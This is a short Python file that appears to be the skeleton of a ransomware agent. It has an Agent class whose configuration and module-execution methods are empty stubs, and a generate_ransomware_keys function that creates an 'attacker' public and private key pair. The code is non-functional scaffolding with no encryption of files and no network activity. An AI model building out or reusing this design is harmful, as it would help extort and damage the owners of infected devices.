from Encryption import *


# Installed on the device, sends metrics to the agent handlers
# reqeusts the config file and the modules needed to be installed



class Agent:

    def __init__(self, id, config_file):
        self.id = id
        self.config_file = config_file

    def update_config(self):
        pass

    def execute_modules(self):
        pass

    
    def generate_ransomware_keys():

        encryption_attacker = Encryption("", "public_attacker.pem","private_attacker.pem")

        # Generate key pairs
        encryption_attacker.generate_keys()

